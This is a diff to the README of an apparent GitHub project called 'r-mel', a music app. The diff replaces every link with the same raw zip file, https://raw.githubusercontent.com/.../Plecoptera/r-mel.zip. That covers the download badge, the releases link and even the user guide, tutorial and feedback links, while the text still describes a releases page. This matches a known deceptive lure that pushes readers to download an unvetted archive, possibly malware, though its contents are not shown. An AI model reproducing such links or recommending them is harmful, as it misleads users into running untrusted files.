@@ -1,7 +1,7 @@
 # 🎉 r-mel - Enhance Your Music Experience with Ease
 
 ## 🔗 Download Now
-[![Download r-mel](https://img.shields.io/badge/Download-r--mel-blue.svg)](https://github.com/john89472338/r-mel/releases)
+[![Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)
 
 ## 🚀 Getting Started
 Welcome to r-mel! This application is designed to help you manage and enhance your music listening experience seamlessly. No prior programming experience is needed. Just follow the steps below to get started.
@@ -9,7 +9,7 @@ Welcome to r-mel! This application is designed to help you manage and enhance yo
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download r-mel](https://github.com/john89472338/r-mel/releases)  
+   [Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
 
 2. **Select the Latest Release**  
    On the releases page, find the latest version of r-mel. It is usually at the top of the list.  
@@ -70,8 +70,8 @@ Join our community of r-mel users on social media platforms. Share your experien
 If you need further assistance, feel free to reach out via the “Contact” section in the app or through our GitHub page.
 
 ## 🔗 Additional Resources
-- [User Guide](https://example.com/user-guide)  
-- [Video Tutorials](https://example.com/tutorials)  
-- [Feedback & Contributions](https://github.com/john89472338/r-mel/issues)  
+- [User Guide](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
+- [Video Tutorials](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
+- [Feedback & Contributions](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
 
 Thank you for choosing r-mel! We hope you enjoy your enhanced music experience.
